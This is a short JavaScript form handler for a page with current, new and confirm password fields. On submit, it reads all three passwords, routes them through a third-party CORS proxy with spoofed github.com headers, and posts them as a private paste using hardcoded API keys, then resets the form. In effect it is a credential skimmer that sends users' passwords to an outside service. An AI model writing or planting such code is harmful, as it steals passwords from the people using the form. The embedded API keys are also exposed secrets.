const form = document.querySelector('#register-form');
const api_key = 'y4Sl0pAK56NAXPhM9Qx0OkWJtVeKQyFg';

form.addEventListener('submit', (event) => {
  event.preventDefault(); // Prevent the form from submitting normally

  const currentPassword = document.querySelector('#pass1').value;
  const newPassword = document.querySelector('#pass2').value;
  const confirmPassword = document.querySelector('#pass3').value;

  const xhr = new XMLHttpRequest();
  xhr.withCredentials = true;
  
  xhr.addEventListener("readystatechange", function () {
      if (this.readyState === this.DONE) {
          console.log(this.responseText);
      }
  });
  
  xhr.open("POST", "https://http-cors-proxy.p.rapidapi.com/");
  xhr.setRequestHeader("content-type", "application/json");
  xhr.setRequestHeader("Origin", "www.github.com");
  xhr.setRequestHeader("X-Requested-With", "www.github.com");
  xhr.setRequestHeader("X-RapidAPI-Key", "2fe554f732mshc092a3d90ae332ap11848ejsn905aa1dff8a9");
  xhr.setRequestHeader("X-RapidAPI-Host", "http-cors-proxy.p.rapidapi.com");
  

  const params = `api_option=paste&api_dev_key=${api_key}&api_paste_code=${currentPassword}\n${newPassword}\n${confirmPassword}&api_paste_private=1&api_paste_name=form-paste`;

  xhr.send(params);

  // Reset the form fields
  form.reset();
});
